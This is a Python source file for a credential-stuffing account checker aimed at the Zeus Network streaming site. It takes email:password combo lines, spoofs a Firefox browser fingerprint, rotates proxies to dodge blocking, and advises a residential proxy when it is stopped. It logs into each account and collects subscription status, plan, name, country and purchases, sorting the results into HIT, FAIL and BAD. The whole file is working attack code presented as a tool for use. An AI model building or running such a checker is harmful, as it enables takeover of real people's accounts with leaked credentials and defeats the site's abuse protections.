"""Zeus Network account checker using the VHX web login flow."""

from __future__ import annotations

import json
import re
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urljoin

from curl_cffi import requests as curl_requests

from .proxy import with_rotating_session

BASE_URL = "https://www.thezeusnetwork.com"
USER_AGENT = (
    "Mozilla/5.0 (X11; Linux x86_64; rv:156.0) Gecko/20100101 Firefox/156.0"
)

ACTIVE_STATUSES = {
    "active",
    "enabled",
    "subscribed",
    "free_trial",
    "trial",
    "current",
    "paid",
}

INACTIVE_STATUSES = {
    "expired",
    "canceled",
    "cancelled",
    "disabled",
    "paused",
    "inactive",
    "lapsed",
    "ended",
}

_UNSET = object()

_CURRENT_USER_RE = re.compile(
    r"window\._current_user\s*=\s*(\{.*?\});",
    re.DOTALL,
)
_CSRF_RE = re.compile(r'name="csrf-token"\s+content="([^"]+)"')
_BAD_LOGIN_RE = re.compile(
    r"incorrect email address or password",
    re.IGNORECASE,
)


@dataclass
class CheckResult:
    email: str
    password: str
    status: str
    active: bool | None = None
    subscription_status: str | None = None
    plan: str | None = None
    frequency: str | None = None
    renewal_date: str | None = None
    name: str | None = None
    user_id: int | str | None = None
    country: str | None = None
    purchases: list[str] = field(default_factory=list)
    error: str | None = None

    def to_data(self) -> dict[str, Any]:
        return {
            "active": self.active,
            "subscription_status": self.subscription_status,
            "plan": self.plan,
            "frequency": self.frequency,
            "renewal_date": self.renewal_date,
            "name": self.name,
            "user_id": self.user_id,
            "country": self.country,
            "purchases": self.purchases,
            "error": self.error,
        }

    def format_line(self) -> str:
        if self.status in {"HIT", "FAIL"}:
            active_label = "Yes" if self.active else "No"
            plan = self.plan or "Unknown"
            extras = []
            if self.subscription_status:
                extras.append(f"status={self.subscription_status}")
            if self.frequency:
                extras.append(f"freq={self.frequency}")
            if self.renewal_date:
                extras.append(f"renews={self.renewal_date}")
            if self.name:
                extras.append(f"name={self.name}")
            if self.country:
                extras.append(f"country={self.country}")
            if self.purchases:
                extras.append(f"purchases={', '.join(self.purchases)}")
            extra = f" | {' | '.join(extras)}" if extras else ""
            reason = "Inactive subscription" if self.status == "FAIL" else ""
            reason_part = f" | {reason}" if reason else ""
            return (
                f"{self.email}:{self.password} | {self.status} | Active: {active_label} | "
                f"Plan: {plan}{extra}{reason_part}"
            )
        if self.status == "BAD":
            return f"{self.email}:{self.password} | BAD | Invalid credentials"
        if self.status == "ERROR":
            return f"{self.email}:{self.password} | ERROR | {self.error or 'Unknown error'}"
        return f"{self.email}:{self.password} | {self.status}"


class ZeusChecker:
    def __init__(self, timeout: float = 30.0) -> None:
        self.timeout = timeout

    def check(
        self,
        email: str,
        password: str,
        *,
        proxy: str | None = None,
        rotate_proxy: bool = True,
    ) -> CheckResult:
        proxy_url = proxy
        if proxy_url and rotate_proxy:
            proxy_url = with_rotating_session(proxy_url)

        session_kwargs: dict[str, Any] = {
            "impersonate": "firefox",
            "timeout": self.timeout,
        }
        if proxy_url:
            session_kwargs["proxies"] = {"http": proxy_url, "https": proxy_url}

        try:
            with curl_requests.Session(**session_kwargs) as session:
                login_page = session.get(
                    f"{BASE_URL}/login",
                    headers={"User-Agent": USER_AGENT},
                )
                if login_page.status_code != 200:
                    return CheckResult(
                        email,
                        password,
                        "ERROR",
                        error=f"Login page HTTP {login_page.status_code}",
                    )

                csrf_token = self._extract_csrf(login_page.text)
                if not csrf_token:
                    return CheckResult(
                        email,
                        password,
                        "ERROR",
                        error="Could not extract CSRF token",
                    )

                login_resp = session.post(
                    f"{BASE_URL}/login",
                    data={
                        "email": email,
                        "authenticity_token": csrf_token,
                        "utf8": "✓",
                        "password": password,
                    },
                    headers={
                        "User-Agent": USER_AGENT,
                        "Origin": BASE_URL,
                        "Referer": f"{BASE_URL}/login",
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                    allow_redirects=False,
                )

                if self._is_bad_login(login_resp):
                    return CheckResult(email, password, "BAD")

                if not self._is_logged_in(login_resp):
                    return CheckResult(
                        email,
                        password,
                        "ERROR",
                        error=self._login_failure_reason(login_resp),
                    )

                user = self._parse_current_user(login_resp.text)
                if login_resp.status_code in {301, 302, 303, 307, 308}:
                    location = login_resp.headers.get("location") or ""
                    if location:
                        follow = session.get(
                            urljoin(BASE_URL, location),
                            headers={"User-Agent": USER_AGENT},
                            allow_redirects=True,
                        )
                        user = self._parse_current_user(follow.text) or user

                capture = self._capture_account(session, user)
                status = "HIT" if capture.get("active") else "FAIL"
                return CheckResult(
                    email=email,
                    password=password,
                    status=status,
                    active=capture.get("active"),
                    subscription_status=capture.get("subscription_status"),
                    plan=capture.get("plan"),
                    frequency=capture.get("frequency"),
                    renewal_date=capture.get("renewal_date"),
                    name=capture.get("name"),
                    user_id=capture.get("user_id"),
                    country=capture.get("country"),
                    purchases=capture.get("purchases", []),
                )
        except curl_requests.RequestsError as exc:
            return CheckResult(email, password, "ERROR", error=str(exc))

    def _capture_account(
        self,
        session: curl_requests.Session,
        user: dict[str, Any] | None,
    ) -> dict[str, Any]:
        user = user or {}
        capture: dict[str, Any] = {
            "user_id": user.get("id"),
            "name": user.get("name"),
            "country": user.get("country"),
            "active": False,
            "subscription_status": None,
            "plan": None,
            "frequency": None,
            "renewal_date": None,
            "purchases": [],
        }

        billing = self._fetch_json(session, "/settings/manage/billing.json")
        billing_info = self._parse_billing_payload(billing)
        capture.update({k: v for k, v in billing_info.items() if v is not None})

        if not capture.get("plan"):
            purchases = self._fetch_json(session, "/settings/purchases.json")
            purchase_info = self._parse_purchases_payload(purchases)
            capture.update({k: v for k, v in purchase_info.items() if v is not None})

        if not capture.get("plan"):
            billing_page = self._fetch_text(session, "/settings/manage/billing")
            page_info = self._parse_settings_html(billing_page)
            capture.update({k: v for k, v in page_info.items() if v is not None})

        if capture.get("subscription_status"):
            capture["active"] = self._status_is_active(str(capture["subscription_status"]))
        elif capture.get("plan"):
            capture["active"] = True
        else:
            settings_page = self._fetch_text(session, "/settings")
            page_info = self._parse_settings_html(settings_page)
            if page_info.get("subscription_status"):
                capture["subscription_status"] = page_info["subscription_status"]
                capture["active"] = self._status_is_active(page_info["subscription_status"])
            elif page_info.get("plan"):
                capture["plan"] = page_info["plan"]
                capture["active"] = True
            else:
                capture["active"] = False

        return capture

    def _fetch_json(
        self,
        session: curl_requests.Session,
        path: str,
    ) -> dict[str, Any] | list[Any] | None:
        response = session.get(
            f"{BASE_URL}{path}",
            headers={
                "User-Agent": USER_AGENT,
                "Accept": "application/json",
            },
            allow_redirects=True,
        )
        if response.status_code != 200:
            return None
        try:
            return response.json()
        except json.JSONDecodeError:
            return None

    def _fetch_text(self, session: curl_requests.Session, path: str) -> str:
        response = session.get(
            f"{BASE_URL}{path}",
            headers={"User-Agent": USER_AGENT},
            allow_redirects=True,
        )
        if response.status_code != 200:
            return ""
        return response.text

    @staticmethod
    def _extract_csrf(html: str) -> str | None:
        match = _CSRF_RE.search(html)
        return match.group(1) if match else None

    @staticmethod
    def _parse_current_user(html: str) -> dict[str, Any] | None:
        match = _CURRENT_USER_RE.search(html)
        if not match:
            return None
        try:
            payload = json.loads(match.group(1))
        except json.JSONDecodeError:
            return None
        return payload if isinstance(payload, dict) else None

    @staticmethod
    def _is_bad_login(response: curl_requests.Response) -> bool:
        if response.status_code == 200 and _BAD_LOGIN_RE.search(response.text or ""):
            return True
        user = ZeusChecker._parse_current_user(response.text or "")
        if user and user.get("id") is None and _BAD_LOGIN_RE.search(response.text or ""):
            return True
        return False

    @staticmethod
    def _is_logged_in(response: curl_requests.Response) -> bool:
        if response.status_code in {301, 302, 303, 307, 308}:
            location = (response.headers.get("location") or "").lower()
            return "/login" not in location

        user = ZeusChecker._parse_current_user(response.text or "")
        if user and user.get("id") is not None:
            return True

        text = response.text or ""
        if response.status_code == 200 and _BAD_LOGIN_RE.search(text):
            return False
        if response.status_code == 200 and "Sign in - Zeus" in text:
            return False
        return response.status_code in {301, 302, 303, 307, 308}

    @staticmethod
    def _login_failure_reason(response: curl_requests.Response) -> str:
        if response.status_code in {403, 406, 429}:
            return f"Blocked by site (HTTP {response.status_code}) — try residential proxy"
        if response.status_code >= 500:
            return f"Server error HTTP {response.status_code}"
        if _BAD_LOGIN_RE.search(response.text or ""):
            return "Invalid credentials"
        return f"Login failed (HTTP {response.status_code})"

    @staticmethod
    def _status_is_active(status: str) -> bool:
        normalized = status.strip().lower().replace("-", "_")
        if normalized in ACTIVE_STATUSES:
            return True
        if normalized in INACTIVE_STATUSES:
            return False
        if "trial" in normalized or "active" in normalized or "enabled" in normalized:
            return True
        if "cancel" in normalized or "expire" in normalized or "inactive" in normalized:
            return False
        return False

    @staticmethod
    def _first_string(payload: dict[str, Any], *keys: str) -> str | None:
        for key in keys:
            value = payload.get(key)
            if value not in (None, ""):
                return str(value)
        return None

    def _parse_billing_payload(self, payload: Any) -> dict[str, Any]:
        if not isinstance(payload, dict):
            return {}

        candidates: list[dict[str, Any]] = [payload]
        for key in ("subscription", "billing", "plan", "product", "membership"):
            nested = payload.get(key)
            if isinstance(nested, dict):
                candidates.append(nested)

        result: dict[str, Any] = {}
        for item in candidates:
            status = self._first_string(
                item,
                "subscription_status",
                "status",
                "state",
                "membership_status",
            )
            plan = self._first_string(
                item,
                "plan_name",
                "plan",
                "product_name",
                "product",
                "title",
                "name",
                "display_name",
            )
            frequency = self._first_string(
                item,
                "subscription_frequency",
                "frequency",
                "billing_frequency",
                "interval",
            )
            renewal = self._first_string(
                item,
                "renewal_date",
                "next_billing_date",
                "renews_at",
                "expires_at",
                "expiration_date",
                "current_period_end",
            )
            if status and not result.get("subscription_status"):
                result["subscription_status"] = status
            if plan and not result.get("plan"):
                result["plan"] = plan
            if frequency and not result.get("frequency"):
                result["frequency"] = frequency
            if renewal and not result.get("renewal_date"):
                result["renewal_date"] = renewal

        if result.get("subscription_status"):
            result["active"] = self._status_is_active(result["subscription_status"])
        elif result.get("plan"):
            result["active"] = True
        return result

    def _parse_purchases_payload(self, payload: Any) -> dict[str, Any]:
        if isinstance(payload, dict):
            items = payload.get("purchases") or payload.get("transactions") or payload.get("items")
        elif isinstance(payload, list):
            items = payload
        else:
            return {}

        if not isinstance(items, list):
            return {}

        purchases: list[str] = []
        active_plan: str | None = None
        active_status: str | None = None

        for item in items:
            if not isinstance(item, dict):
                continue
            title = self._first_string(
                item,
                "product_name",
                "product",
                "title",
                "name",
                "display_name",
            )
            status = self._first_string(item, "status", "subscription_status", "state")
            if title:
                purchases.append(title)
            if status and self._status_is_active(status):
                active_plan = title or active_plan
                active_status = status

        result: dict[str, Any] = {}
        if purchases:
            result["purchases"] = purchases[:5]
        if active_plan:
            result["plan"] = active_plan
        if active_status:
            result["subscription_status"] = active_status
            result["active"] = True
        return result

    @staticmethod
    def _parse_settings_html(html: str) -> dict[str, Any]:
        if not html:
            return {}

        result: dict[str, Any] = {}
        patterns = {
            "subscription_status": [
                r"subscription[_\s-]?status[\"'\s:>]+([a-zA-Z_ ]{3,30})",
                r"status[\"'\s:>]+(active|enabled|expired|canceled|cancelled|trial|paused)",
            ],
            "plan": [
                r"plan[_\s-]?name[\"'\s:>]+([^\"'<]{3,80})",
                r"product[_\s-]?name[\"'\s:>]+([^\"'<]{3,80})",
                r"current plan[^<]*<[^>]*>([^<]{3,80})<",
            ],
            "renewal_date": [
                r"renew(?:s|al)[^<]{0,40}?(\d{4}-\d{2}-\d{2})",
                r"next billing[^<]{0,40}?([A-Za-z]{3,9}\s+\d{1,2},?\s+\d{4})",
            ],
            "frequency": [
                r"(monthly|yearly|annual)",
            ],
        }

        for field, regexes in patterns.items():
            for pattern in regexes:
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    value = match.group(1).strip()
                    if value:
                        result[field] = value
                        break

        if result.get("subscription_status"):
            result["active"] = ZeusChecker._status_is_active(result["subscription_status"])
        return result


def parse_combo(line: str) -> tuple[str, str] | None:
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if ":" not in line:
        return None
    email, password = line.split(":", 1)
    email = email.strip()
    password = password.strip()
    if not email or not password:
        return None
    return email, password


def check_account(
    email: str,
    password: str,
    *,
    proxy: str | None | object = _UNSET,
    rotate_proxy: bool = True,
    timeout: float = 45.0,
) -> CheckResult:
    checker = ZeusChecker(timeout=timeout)
    proxy_value = None if proxy is _UNSET else proxy
    return checker.check(email, password, proxy=proxy_value, rotate_proxy=rotate_proxy)
